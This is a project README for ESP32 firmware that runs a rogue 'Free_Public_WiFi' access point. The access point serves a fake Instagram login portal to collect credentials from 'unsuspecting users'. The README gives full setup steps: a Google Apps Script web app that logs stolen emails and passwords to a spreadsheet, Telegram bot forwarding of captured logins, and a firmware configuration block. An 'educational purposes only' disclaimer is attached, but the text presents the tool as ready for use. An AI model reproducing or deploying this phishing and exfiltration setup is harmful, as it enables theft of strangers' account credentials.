<div align="center">
  <h1>🛡️ NEXUS WIFI SECURITY v5.0 🛡️</h1>
  <p><strong>Advanced Captive Portal & Threat Intelligence System for ESP32</strong></p>

  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
  [![Platform: ESP32](https://img.shields.io/badge/Platform-ESP32-blue)](https://www.espressif.com/en/products/socs/esp32)
  [![Language: C++](https://img.shields.io/badge/Language-C++-00599C)](https://isocpp.org/)
  [![Developer: Javed](https://img.shields.io/badge/Developer-Javed%20Hussain-success)](https://github.com/iamjaved026)
</div>

---

> [!CAUTION]
> **LEGAL DISCLAIMER:** This software is provided for **educational and research purposes only**. Unauthorized use of this tool to capture credentials or intercept network traffic may violate local, state, and federal laws. The user assumes ALL legal responsibility for the usage of this software. The developer (**Muhammad Javed Hussain**) assumes **NO LIABILITY** for any misuse, illegal activities, or damage caused by this platform. By using this software, you agree to these terms.

---

## 📖 What is Nexus WiFi?

**Nexus WiFi Security v5.0** is an enterprise-grade, highly advanced Captive Portal and Threat Intelligence platform designed specifically for the ESP32 microcontroller. It acts as a Rogue Access Point to intercept client devices, funneling them through a meticulously crafted captive portal (simulated social media login) to harvest credentials and track network activity in real-time.

## 🚀 Key Features

*   **⚡ Advanced Captive Portal:** Highly realistic simulated login pages (Instagram clone) to capture user credentials efficiently.
*   **📡 Real-time Device Tracking:** Monitors connected devices, logging MAC addresses, IP addresses, RSSI (Signal Strength), OS, and browser types.
*   **📱 Telegram Bridge:** Instant notifications delivered straight to your Telegram app whenever a device connects, credentials are captured, or an admin logs in.
*   **📊 Google Sheets Integration:** Automatically backs up all captured credentials and device telemetry securely to a Google Spreadsheet.
*   **💻 Secure Admin Dashboard:** A sleek, fully responsive J.A.R.V.I.S. themed web dashboard to monitor system logs, view connected devices, and manage settings. Includes brute-force protection (5 attempts lockout).
*   **🔐 MAC Authentication:** System-level tracking to verify if a device has successfully passed through the captive portal.

## ⚙️ How It Works

1.  The ESP32 broadcasts an open Rogue Access Point (e.g., `Free_Public_WiFi`).
2.  Unsuspecting users connect to the AP and are automatically met with a captive portal popup.
3.  Upon entering credentials, the system captures the data alongside the user's MAC, IP, and device fingerprint.
4.  Data is instantly transmitted to **Telegram** and silently logged into **Google Sheets**.
5.  The system administrator monitors everything live via the secure local `192.168.4.1/admin` dashboard.

---

## 🛠️ Configuration & Setup

### Prerequisites
*   An **ESP32** development board.
*   **Arduino IDE** installed with ESP32 board support.
*   Required Libraries (Install via Library Manager): `ESPAsyncWebServer`, `AsyncTCP`, `ArduinoJson`.

### Step 1: Get Your Telegram Bot Token & Chat ID
1. Open Telegram and search for **[@BotFather](https://t.me/BotFather)**.
2. Send `/newbot`, choose a name and username, and copy the provided **HTTP API Token**.
3. Search for **[@userinfobot](https://t.me/userinfobot)** or similar to find your personal **Chat ID**.
4. Start a conversation with your newly created bot to allow it to message you.

### Step 2: Set Up Google Sheets Logging
1. Create a new [Google Sheet](https://docs.google.com/spreadsheets).
2. Go to `Extensions` > `Apps Script`.
3. Paste the following script (replace the default code):
   ```javascript
   function doPost(e) {
     var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
     var rowData = [e.parameter.time, e.parameter.device, e.parameter.mac, e.parameter.ip, e.parameter.email, e.parameter.password];
     sheet.appendRow(rowData);
     return ContentService.createTextOutput("Success");
   }
   ```
4. Click **Deploy** > **New deployment**. Select type **Web app**.
5. Execute as: **Me**. Who has access: **Anyone**.
6. Click Deploy, authorize the permissions, and copy the **Web app URL**.

### Step 3: Configure the Firmware
Open `nexus_wifi_v5.ino` in Arduino IDE and update the Configuration Section at the top of the file:

```cpp
// Real Wi-Fi Credentials (for internet access to send Telegram/Google alerts)
const char* realSSID = "YOUR_HOME_WIFI_SSID"; 
const char* realPassword = "YOUR_HOME_WIFI_PASSWORD"; 

// Google Forms Endpoint
const char* googleScriptUrl = "YOUR_GOOGLE_APP_SCRIPT_URL"; 

// Telegram Bot Settings
const char* telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"; 
const char* telegramChatID = "YOUR_TELEGRAM_CHAT_ID"; 

// Admin Panel Settings
const char *adminPin = "12345678"; // Change this PIN!
```

### Step 4: Flash & Monitor
1. Select your ESP32 board and COM port in Arduino IDE.
2. Hit **Upload**.
3. Open the Serial Monitor (115200 baud) to watch the beautiful boot sequence!

---

## 🛡️ Admin Dashboard Access
Once the ESP32 is running, connect to its Wi-Fi network (default: `Free_Public_WiFi`) and navigate to:
*   **Admin Panel:** `http://192.168.4.1/admin`
*   **Default PIN:** `12345678`

---

## 📜 License & Credits

*   **Author:** [Muhammad Javed Hussain](https://github.com/iamjaved026)
*   **Repository:** [nexus-wifi](https://github.com/iamjaved026/nexus-wifi)
*   **License:** Distributed under the **MIT License**. See `LICENSE` for more information.

> "Security is not a product, but a process."

<div align="center">
  <i>Made with ❤️ by Muhammad Javed Hussain</i>
</div>
